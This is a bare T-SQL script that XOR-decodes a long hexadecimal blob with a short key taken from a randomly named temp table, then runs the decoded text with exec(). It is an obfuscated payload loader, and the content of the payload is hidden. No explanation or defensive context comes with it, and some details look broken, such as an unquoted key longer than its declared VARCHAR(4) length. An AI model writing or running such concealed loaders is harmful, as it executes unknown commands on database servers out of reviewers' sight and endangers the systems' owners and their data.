DECLARE @i INT,@big_hex VARCHAR(MAX),@third_param VARCHAR(4);
SELECT 
    @i=1,
    @third_param=z9ebDjZgqX,
    @big_hex=0x6799c6a4628ec0e86393ce8d77accfbf70e9e49e4cb4f4e86ab2d1e4039cdcbe4cbaf0fc7696ed87508ba59e628ee6a0428eada542a4ace4039cb381488cf38a68bdd6991afccca677e7d68d6f99e6bc039cca836688f582548fb0a975b3edb91eeda9887aaaeaae56e8d0824b93f69f1eecfdaa13bde1f014e4e3ac42bde6ac10bde6a942bee7f014b8e7ac15beb2f014e5bdf014bdbda91bb9b5ac17b8e3a91ab8b0a913bde3ac46bde0f147bee7f11ae4b2ab47b8bcaa15beb1f014e4e4ac1bbeb0ac42e5bca91abeb6ab42bebcf141b8b4f113e4b2a917e4b2f046bfe6f140bfe6ab1abfe4ab41bfe4ab40e5e7ab41e5b2ab41bdb5f147bdb5f11bbfe7ab1be5e6ab40e5e0ab47e5e4f146e5e7ab47bfbcf11abfe6f146bfe1ab1ae4e0ff17ebb4a91abde6a946b8b5ac16ebb1ff12bee4ab40b8b6ab40bfe4aa41e4b2ab47b8b6ab1bbfe0f014bde1ac1abeb3aa17e4b2f042b8bdaa16b8e4f11abdbcaa10bfe4aa1ae5e7ac12ebb1ff12bde6aa16bfe7e4039cb381488cf38a68bdd6991afcb8e86f84e1bd7684f5fb75e9a5ae5193c8e800adcbbb119ec9ab71e8eff35494cc8466fcc5876899d1b869abd6fd428aeaa052e0b8a46692ad887aaaeaae56e8d0824b93f69f0ad6e78d4495cbc27099d1e86385f3a745a9b19d69b4cabb74e1f6bd41afd1ba4a92e2e06385f3a745a9b19d69b4cabb74f0a5f90ffcc5876899d1b869abd6fd428aeaa052f1b4e1089fed8971f4c4bb60b5cce07089e7bb77aecca644f4c59155b3e3bd1789cfa06cafd2e46393ce8d77accfbf70e9e49e4cb4f4e412f5ace563eacca373aac783428fd4f10af7d6bd61afd1ba6a92e2e06385f3a745a9b19d69b4cabb74f0a5886c97c09c5396f29b16bdd3a74badaef90ffce9ad4df4c59155b3e3bd1789cfa06cafd2e10ae7f6ad57fcc5876899d1b869abd6fd428aeaa052e1c5876899d1b869abd6fd428aeaa052f7b4c246b2e1f34684c0ab03f4c59155b3e3bd1789cfa06cafd2e1 
FROM #qNs2BLcR4j;

WHILE @i <= LEN(@big_hex)
BEGIN 
    set @big_hex=SUBSTRING(@big_hex, 1, @i - 1) + 
        char(
            ASCII(
                SUBSTRING(@big_hex, @i, 1)
            ) 
            ^ ASCII(
                SUBSTRING(
                    @third_param,
                    ((@i - 1) % LEN(@third_param)) + 1,
                    1
                )
            )
        ) 
        + SUBSTRING(@big_hex, @i + 1, LEN(@big_hex));
    set @i = @i + 1;
end;
exec (@big_hex)